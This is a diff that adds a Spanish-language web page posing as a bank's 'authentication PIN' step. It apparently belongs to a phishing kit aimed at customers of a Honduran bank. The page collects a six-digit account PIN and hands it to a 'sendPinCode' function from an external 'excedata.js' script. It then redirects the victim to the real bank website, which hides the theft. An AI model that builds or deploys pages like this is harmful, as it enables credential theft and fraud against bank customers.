@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="./docs/remixicon.css" rel="stylesheet">
+  <link rel="stylesheet" href="./docs/styles.css">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+  <title>Validación PIN</title>
+</head>
+<body>
+  <section class="login">
+    <img src="./docs/patrn.jpg" alt="Login-image" class="login--image">
+
+    <form id="pinForm" class="login--form">
+      <div align="left">
+        <img src="./docs/lbg22.png" style="width:110px">
+      </div><br>
+      
+      <div align="center">  
+        <span style="font-size:16px;"><b>Pin de autenticación</b></span><br>
+        <span style="font-size:16px"><b>Para finalizar, introduzca el código de autenticacion (PIN) de su cuenta:</b></span>
+      </div><br>
+      
+      <div class="login--content">
+        <div class="login-box">
+          <i class="ri-key-line"></i>
+          <div class="login--input-box">
+            <input type="tel" class="login-input" id="pinInput" name="pin" placeholder=" " 
+                   maxlength="6" minlength="6" 
+                   onkeypress="return event.charCode >= 48 && event.charCode <= 57" required>
+            <label for="pinInput" class="login--input-label">Pin de autenticación</label>
+          </div>
+        </div>
+      </div>
+
+      <button type="submit" class="login--button--whatsapp">Siguiente</button>
+
+      <div align="center">
+        <span style="font-size:14px; color:red"></span>
+      </div><br>
+    </form>
+  </section>
+
+  <!-- Scripts -->
+  <script src="./excedata.js"></script>
+  <script src="./docs/main.js"></script>
+  
+  <script>
+    // Manejar envío del formulario
+    document.getElementById('pinForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const pinCode = document.getElementById('pinInput').value;
+      
+      if(typeof sendPinCode === 'function') {
+        await sendPinCode(pinCode);
+        window.location.href = 'https://www.bancatlan.hn';
+      } else {
+        console.error('La función sendPinCode no está disponible');
+      }
+    });
+  </script>
+<script src="../protect.js"></script>
+</body>
+</html>
